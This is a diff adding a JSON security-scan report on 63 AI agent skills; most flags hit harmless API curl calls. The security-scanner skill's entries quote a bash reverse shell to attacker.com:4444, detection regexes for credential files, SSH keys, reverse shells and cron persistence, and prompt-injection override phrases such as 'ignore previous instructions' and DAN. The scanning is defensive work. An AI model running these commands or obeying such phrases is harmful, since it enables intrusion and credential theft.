@@ -1,0 +1,968 @@
+{
+  "scan_date": "2026-01-30T20:07:16.086261",
+  "skills_scanned": 63,
+  "reports": [
+    {
+      "name": "yahoo-finance",
+      "path": "/home/mint/.clawdbot/skills/yahoo-finance",
+      "files_scanned": 2,
+      "risk_score": 100,
+      "risk_level": "\ud83d\udd34 CRITICAL",
+      "findings": [
+        {
+          "pattern": "curl_external",
+          "description": "curl to external URL - potential data exfiltration",
+          "risk": 95,
+          "category": "exfiltration",
+          "file": "yahoo-finance/SKILL.md",
+          "line": 27,
+          "content": "curl -LsSf https://astral.sh/uv/install.sh | sh"
+        },
+        {
+          "pattern": "curl_pipe_bash",
+          "description": "curl piped to shell",
+          "risk": 90,
+          "category": "backdoors",
+          "file": "yahoo-finance/SKILL.md",
+          "line": 27,
+          "content": "curl -LsSf https://astral.sh/uv/install.sh | sh"
+        }
+      ]
+    },
+    {
+      "name": "security-scanner",
+      "path": "/home/mint/clawd/skills/security-scanner",
+      "files_scanned": 8,
+      "risk_score": 100,
+      "risk_level": "\ud83d\udd34 CRITICAL",
+      "findings": [
+        {
+          "pattern": "system_override",
+          "description": "System override attempt",
+          "risk": 95,
+          "category": "injection",
+          "file": "security-scanner/README.md",
+          "line": 28,
+          "content": "| \ud83d\udfe0 Prompt Injection | \"ignore instructions\", \"system override\" |"
+        },
+        {
+          "pattern": "requests_post",
+          "description": "Python requests POST/PUT call",
+          "risk": 85,
+          "category": "exfiltration",
+          "file": "security-scanner/README.md",
+          "line": 25,
+          "content": "| \ud83d\udd34 Data Exfiltration | curl/wget to external URLs, requests.post() |"
+        },
+        {
+          "pattern": "bash_reverse_shell",
+          "description": "Bash reverse shell",
+          "risk": 100,
+          "category": "backdoors",
+          "file": "security-scanner/README.md",
+          "line": 98,
+          "content": "\u2514\u2500 bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+        },
+        {
+          "pattern": "ssh_key_access",
+          "description": "SSH key file access",
+          "risk": 90,
+          "category": "obfuscation",
+          "file": "security-scanner/SKILL.md",
+          "line": 89,
+          "content": "- Line 89: Reads ~/.ssh/id_rsa"
+        },
+        {
+          "pattern": "system_override",
+          "description": "System override attempt",
+          "risk": 95,
+          "category": "injection",
+          "file": "security-scanner/SKILL.md",
+          "line": 53,
+          "content": "| \ud83d\udfe0 Prompt Injection | HIGH | \"ignore previous\", \"system override\", \"new instructions\" |"
+        },
+        {
+          "pattern": "requests_post",
+          "description": "Python requests POST/PUT call",
+          "risk": 85,
+          "category": "exfiltration",
+          "file": "security-scanner/SKILL.md",
+          "line": 50,
+          "content": "| \ud83d\udd34 Data Exfiltration | CRITICAL | curl/wget to external domains, fetch(), requests.post() |"
+        },
+        {
+          "pattern": "env_file_read",
+          "description": ".env file access",
+          "risk": 75,
+          "category": "obfuscation",
+          "file": "patterns/obfuscation.yaml",
+          "line": 16,
+          "content": "regex: \"(open|read|cat|source).*\\\\.env\""
+        },
+        {
+          "pattern": "gcp_credentials",
+          "description": "GCP credentials access",
+          "risk": 85,
+          "category": "obfuscation",
+          "file": "patterns/obfuscation.yaml",
+          "line": 31,
+          "content": "regex: \"\\\\.config/gcloud\""
+        },
+        {
+          "pattern": "kube_config",
+          "description": "Kubernetes config access",
+          "risk": 85,
+          "category": "obfuscation",
+          "file": "patterns/obfuscation.yaml",
+          "line": 36,
+          "content": "regex: \"\\\\.kube/config\""
+        },
+        {
+          "pattern": "ignore_previous_instructions",
+          "description": "Classic prompt injection: ignore previous instructions",
+          "risk": 95,
+          "category": "injection",
+          "file": "patterns/injection.yaml",
+          "line": 9,
+          "content": "description: \"Classic prompt injection: ignore previous instructions\""
+        },
+        {
+          "pattern": "new_system_prompt",
+          "description": "Attempting to set new system prompt",
+          "risk": 90,
+          "category": "injection",
+          "file": "patterns/injection.yaml",
+          "line": 19,
+          "content": "description: \"Attempting to set new system prompt\""
+        },
+        {
+          "pattern": "system_override",
+          "description": "System override attempt",
+          "risk": 95,
+          "category": "injection",
+          "file": "patterns/injection.yaml",
+          "line": 24,
+          "content": "description: \"System override attempt\""
+        },
+        {
+          "pattern": "dan_jailbreak",
+          "description": "Known jailbreak keywords (DAN, jailbreak)",
+          "risk": 85,
+          "category": "injection",
+          "file": "patterns/injection.yaml",
+          "line": 29,
+          "content": "description: \"Known jailbreak keywords (DAN, jailbreak)\""
+        },
+        {
+          "pattern": "dan_jailbreak",
+          "description": "Known jailbreak keywords (DAN, jailbreak)",
+          "risk": 85,
+          "category": "injection",
+          "file": "patterns/injection.yaml",
+          "line": 29,
+          "content": "description: \"Known jailbreak keywords (DAN, jailbreak)\""
+        },
+        {
+          "pattern": "dan_jailbreak",
+          "description": "Known jailbreak keywords (DAN, jailbreak)",
+          "risk": 85,
+          "category": "injection",
+          "file": "patterns/injection.yaml",
+          "line": 29,
+          "content": "description: \"Known jailbreak keywords (DAN, jailbreak)\""
+        },
+        {
+          "pattern": "pretend_no_restrictions",
+          "description": "Pretend no restrictions",
+          "risk": 85,
+          "category": "injection",
+          "file": "patterns/injection.yaml",
+          "line": 39,
+          "content": "description: \"Pretend no restrictions\""
+        },
+        {
+          "pattern": "admin_override",
+          "description": "Admin/root override attempt",
+          "risk": 90,
+          "category": "injection",
+          "file": "patterns/injection.yaml",
+          "line": 44,
+          "content": "description: \"Admin/root override attempt\""
+        },
+        {
+          "pattern": "base64_curl",
+          "description": "Base64 encoding piped to curl",
+          "risk": 95,
+          "category": "exfiltration",
+          "file": "patterns/exfiltration.yaml",
+          "line": 31,
+          "content": "regex: \"base64.*\\\\|.*curl\""
+        },
+        {
+          "pattern": "perl_reverse_shell",
+          "description": "Perl reverse shell",
+          "risk": 100,
+          "category": "backdoors",
+          "file": "patterns/backdoors.yaml",
+          "line": 21,
+          "content": "regex: \"perl.*socket.*exec|perl.*-e.*socket\""
+        },
+        {
+          "pattern": "perl_reverse_shell",
+          "description": "Perl reverse shell",
+          "risk": 100,
+          "category": "backdoors",
+          "file": "patterns/backdoors.yaml",
+          "line": 21,
+          "content": "regex: \"perl.*socket.*exec|perl.*-e.*socket\""
+        },
+        {
+          "pattern": "os_system",
+          "description": "os.system() - prefer subprocess",
+          "risk": 75,
+          "category": "backdoors",
+          "file": "patterns/backdoors.yaml",
+          "line": 43,
+          "content": "description: \"os.system() - prefer subprocess\""
+        },
+        {
+          "pattern": "cron_creation",
+          "description": "Cron job manipulation",
+          "risk": 70,
+          "category": "backdoors",
+          "file": "patterns/backdoors.yaml",
+          "line": 46,
+          "content": "regex: \"(crontab|/etc/cron)\""
+        },
+        {
+          "pattern": "cron_creation",
+          "description": "Cron job manipulation",
+          "risk": 70,
+          "category": "backdoors",
+          "file": "patterns/backdoors.yaml",
+          "line": 46,
+          "content": "regex: \"(crontab|/etc/cron)\""
+        },
+        {
+          "pattern": "systemd_creation",
+          "description": "Systemd service manipulation",
+          "risk": 75,
+          "category": "backdoors",
+          "file": "patterns/backdoors.yaml",
+          "line": 51,
+          "content": "regex: \"(/etc/systemd|systemctl\\\\s+(enable|start))\""
+        },
+        {
+          "pattern": "ssh_authorized_keys",
+          "description": "SSH authorized_keys modification",
+          "risk": 95,
+          "category": "backdoors",
+          "file": "patterns/backdoors.yaml",
+          "line": 61,
+          "content": "regex: \"\\\\.ssh/authorized_keys\""
+        }
+      ]
+    },
+    {
+      "name": "canvas",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/canvas",
+      "files_scanned": 1,
+      "risk_score": 100,
+      "risk_level": "\ud83d\udd34 CRITICAL",
+      "findings": [
+        {
+          "pattern": "curl_external",
+          "description": "curl to external URL - potential data exfiltration",
+          "risk": 95,
+          "category": "exfiltration",
+          "file": "canvas/SKILL.md",
+          "line": 153,
+          "content": "3. Test URL directly: `curl http://<hostname>:18793/__clawdbot__/canvas/<file>.html`"
+        }
+      ]
+    },
+    {
+      "name": "trello",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/trello",
+      "files_scanned": 1,
+      "risk_score": 100,
+      "risk_level": "\ud83d\udd34 CRITICAL",
+      "findings": [
+        {
+          "pattern": "curl_external",
+          "description": "curl to external URL - potential data exfiltration",
+          "risk": 95,
+          "category": "exfiltration",
+          "file": "trello/SKILL.md",
+          "line": 28,
+          "content": "curl -s \"https://api.trello.com/1/members/me/boards?key=$TRELLO_API_KEY&token=$TRELLO_TOKEN\" | jq '."
+        },
+        {
+          "pattern": "curl_external",
+          "description": "curl to external URL - potential data exfiltration",
+          "risk": 95,
+          "category": "exfiltration",
+          "file": "trello/SKILL.md",
+          "line": 33,
+          "content": "curl -s \"https://api.trello.com/1/boards/{boardId}/lists?key=$TRELLO_API_KEY&token=$TRELLO_TOKEN\" | "
+        },
+        {
+          "pattern": "curl_external",
+          "description": "curl to external URL - potential data exfiltration",
+          "risk": 95,
+          "category": "exfiltration",
+          "file": "trello/SKILL.md",
+          "line": 38,
+          "content": "curl -s \"https://api.trello.com/1/lists/{listId}/cards?key=$TRELLO_API_KEY&token=$TRELLO_TOKEN\" | jq"
+        },
+        {
+          "pattern": "curl_external",
+          "description": "curl to external URL - potential data exfiltration",
+          "risk": 95,
+          "category": "exfiltration",
+          "file": "trello/SKILL.md",
+          "line": 43,
+          "content": "curl -s -X POST \"https://api.trello.com/1/cards?key=$TRELLO_API_KEY&token=$TRELLO_TOKEN\" \\"
+        },
+        {
+          "pattern": "curl_external",
+          "description": "curl to external URL - potential data exfiltration",
+          "risk": 95,
+          "category": "exfiltration",
+          "file": "trello/SKILL.md",
+          "line": 51,
+          "content": "curl -s -X PUT \"https://api.trello.com/1/cards/{cardId}?key=$TRELLO_API_KEY&token=$TRELLO_TOKEN\" \\"
+        },
+        {
+          "pattern": "curl_external",
+          "description": "curl to external URL - potential data exfiltration",
+          "risk": 95,
+          "category": "exfiltration",
+          "file": "trello/SKILL.md",
+          "line": 57,
+          "content": "curl -s -X POST \"https://api.trello.com/1/cards/{cardId}/actions/comments?key=$TRELLO_API_KEY&token="
+        },
+        {
+          "pattern": "curl_external",
+          "description": "curl to external URL - potential data exfiltration",
+          "risk": 95,
+          "category": "exfiltration",
+          "file": "trello/SKILL.md",
+          "line": 63,
+          "content": "curl -s -X PUT \"https://api.trello.com/1/cards/{cardId}?key=$TRELLO_API_KEY&token=$TRELLO_TOKEN\" \\"
+        },
+        {
+          "pattern": "curl_external",
+          "description": "curl to external URL - potential data exfiltration",
+          "risk": 95,
+          "category": "exfiltration",
+          "file": "trello/SKILL.md",
+          "line": 77,
+          "content": "curl -s \"https://api.trello.com/1/members/me/boards?key=$TRELLO_API_KEY&token=$TRELLO_TOKEN&fields=n"
+        },
+        {
+          "pattern": "curl_external",
+          "description": "curl to external URL - potential data exfiltration",
+          "risk": 95,
+          "category": "exfiltration",
+          "file": "trello/SKILL.md",
+          "line": 80,
+          "content": "curl -s \"https://api.trello.com/1/members/me/boards?key=$TRELLO_API_KEY&token=$TRELLO_TOKEN\" | jq '."
+        },
+        {
+          "pattern": "curl_external",
+          "description": "curl to external URL - potential data exfiltration",
+          "risk": 95,
+          "category": "exfiltration",
+          "file": "trello/SKILL.md",
+          "line": 83,
+          "content": "curl -s \"https://api.trello.com/1/boards/{boardId}/cards?key=$TRELLO_API_KEY&token=$TRELLO_TOKEN\" | "
+        }
+      ]
+    },
+    {
+      "name": "weather",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/weather",
+      "files_scanned": 1,
+      "risk_score": 100,
+      "risk_level": "\ud83d\udd34 CRITICAL",
+      "findings": [
+        {
+          "pattern": "curl_external",
+          "description": "curl to external URL - potential data exfiltration",
+          "risk": 95,
+          "category": "exfiltration",
+          "file": "weather/SKILL.md",
+          "line": 44,
+          "content": "curl -s \"https://api.open-meteo.com/v1/forecast?latitude=51.5&longitude=-0.12&current_weather=true\""
+        }
+      ]
+    },
+    {
+      "name": "notion",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/notion",
+      "files_scanned": 1,
+      "risk_score": 100,
+      "risk_level": "\ud83d\udd34 CRITICAL",
+      "findings": [
+        {
+          "pattern": "curl_external",
+          "description": "curl to external URL - potential data exfiltration",
+          "risk": 95,
+          "category": "exfiltration",
+          "file": "notion/SKILL.md",
+          "line": 28,
+          "content": "curl -X GET \"https://api.notion.com/v1/...\" \\"
+        },
+        {
+          "pattern": "curl_external",
+          "description": "curl to external URL - potential data exfiltration",
+          "risk": 95,
+          "category": "exfiltration",
+          "file": "notion/SKILL.md",
+          "line": 40,
+          "content": "curl -X POST \"https://api.notion.com/v1/search\" \\"
+        },
+        {
+          "pattern": "curl_external",
+          "description": "curl to external URL - potential data exfiltration",
+          "risk": 95,
+          "category": "exfiltration",
+          "file": "notion/SKILL.md",
+          "line": 49,
+          "content": "curl \"https://api.notion.com/v1/pages/{page_id}\" \\"
+        },
+        {
+          "pattern": "curl_external",
+          "description": "curl to external URL - potential data exfiltration",
+          "risk": 95,
+          "category": "exfiltration",
+          "file": "notion/SKILL.md",
+          "line": 56,
+          "content": "curl \"https://api.notion.com/v1/blocks/{page_id}/children\" \\"
+        },
+        {
+          "pattern": "curl_external",
+          "description": "curl to external URL - potential data exfiltration",
+          "risk": 95,
+          "category": "exfiltration",
+          "file": "notion/SKILL.md",
+          "line": 63,
+          "content": "curl -X POST \"https://api.notion.com/v1/pages\" \\"
+        },
+        {
+          "pattern": "curl_external",
+          "description": "curl to external URL - potential data exfiltration",
+          "risk": 95,
+          "category": "exfiltration",
+          "file": "notion/SKILL.md",
+          "line": 78,
+          "content": "curl -X POST \"https://api.notion.com/v1/data_sources/{data_source_id}/query\" \\"
+        },
+        {
+          "pattern": "curl_external",
+          "description": "curl to external URL - potential data exfiltration",
+          "risk": 95,
+          "category": "exfiltration",
+          "file": "notion/SKILL.md",
+          "line": 90,
+          "content": "curl -X POST \"https://api.notion.com/v1/data_sources\" \\"
+        },
+        {
+          "pattern": "curl_external",
+          "description": "curl to external URL - potential data exfiltration",
+          "risk": 95,
+          "category": "exfiltration",
+          "file": "notion/SKILL.md",
+          "line": 107,
+          "content": "curl -X PATCH \"https://api.notion.com/v1/pages/{page_id}\" \\"
+        },
+        {
+          "pattern": "curl_external",
+          "description": "curl to external URL - potential data exfiltration",
+          "risk": 95,
+          "category": "exfiltration",
+          "file": "notion/SKILL.md",
+          "line": 116,
+          "content": "curl -X PATCH \"https://api.notion.com/v1/blocks/{page_id}/children\" \\"
+        }
+      ]
+    },
+    {
+      "name": "openai-whisper-api",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/openai-whisper-api",
+      "files_scanned": 2,
+      "risk_score": 100,
+      "risk_level": "\ud83d\udd34 CRITICAL",
+      "findings": [
+        {
+          "pattern": "curl_external",
+          "description": "curl to external URL - potential data exfiltration",
+          "risk": 95,
+          "category": "exfiltration",
+          "file": "scripts/transcribe.sh",
+          "line": 75,
+          "content": "curl -sS https://api.openai.com/v1/audio/transcriptions \\"
+        }
+      ]
+    },
+    {
+      "name": "1password",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/1password",
+      "files_scanned": 3,
+      "risk_score": 85,
+      "risk_level": "\ud83d\udd34 CRITICAL",
+      "findings": [
+        {
+          "pattern": "password_hardcoded",
+          "description": "Hardcoded password pattern",
+          "risk": 80,
+          "category": "obfuscation",
+          "file": "references/cli-examples.md",
+          "line": 17,
+          "content": "- `export DB_PASSWORD=\"op://app-prod/db/password\"`"
+        }
+      ]
+    },
+    {
+      "name": "self-improving-agent",
+      "path": "/home/mint/.clawdbot/skills/self-improving-agent",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "reflect-learn",
+      "path": "/home/mint/.clawdbot/skills/reflect-learn",
+      "files_scanned": 6,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "agent-browser",
+      "path": "/home/mint/.clawdbot/skills/agent-browser",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "humanizer",
+      "path": "/home/mint/.clawdbot/skills/humanizer",
+      "files_scanned": 3,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "crypto-tracker",
+      "path": "/home/mint/.clawdbot/skills/crypto-tracker",
+      "files_scanned": 3,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "kraken",
+      "path": "/home/mint/.clawdbot/skills/kraken",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "crypto-price",
+      "path": "/home/mint/.clawdbot/skills/crypto-price",
+      "files_scanned": 2,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "portfolio-watcher",
+      "path": "/home/mint/.clawdbot/skills/portfolio-watcher",
+      "files_scanned": 2,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "bird",
+      "path": "/home/mint/.clawdbot/skills/bird",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "blucli",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/blucli",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "clawdhub",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/clawdhub",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "himalaya",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/himalaya",
+      "files_scanned": 3,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "mcporter",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/mcporter",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "gemini",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/gemini",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "discord",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/discord",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "github",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/github",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "blogwatcher",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/blogwatcher",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "gog",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/gog",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "oracle",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/oracle",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "skill-creator",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/skill-creator",
+      "files_scanned": 4,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "openai-image-gen",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/openai-image-gen",
+      "files_scanned": 2,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "openai-whisper",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/openai-whisper",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "wacli",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/wacli",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "openhue",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/openhue",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "summarize",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/summarize",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "nano-pdf",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/nano-pdf",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "goplaces",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/goplaces",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "gifgrep",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/gifgrep",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "peekaboo",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/peekaboo",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "obsidian",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/obsidian",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "local-places",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/local-places",
+      "files_scanned": 6,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "spotify-player",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/spotify-player",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "songsee",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/songsee",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "bear-notes",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/bear-notes",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "session-logs",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/session-logs",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "nano-banana-pro",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/nano-banana-pro",
+      "files_scanned": 2,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "slack",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/slack",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "food-order",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/food-order",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "bluebubbles",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/bluebubbles",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "ordercli",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/ordercli",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "sonoscli",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/sonoscli",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "video-frames",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/video-frames",
+      "files_scanned": 2,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "eightctl",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/eightctl",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "coding-agent",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/coding-agent",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "model-usage",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/model-usage",
+      "files_scanned": 3,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "things-mac",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/things-mac",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "imsg",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/imsg",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "sherpa-onnx-tts",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/sherpa-onnx-tts",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "apple-notes",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/apple-notes",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "camsnap",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/camsnap",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "apple-reminders",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/apple-reminders",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "bird",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/bird",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "sag",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/sag",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "tmux",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/tmux",
+      "files_scanned": 3,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    },
+    {
+      "name": "voice-call",
+      "path": "/home/mint/.npm-global/lib/node_modules/clawdbot/skills/voice-call",
+      "files_scanned": 1,
+      "risk_score": 0,
+      "risk_level": "\u2705 CLEAN",
+      "findings": []
+    }
+  ]
+}
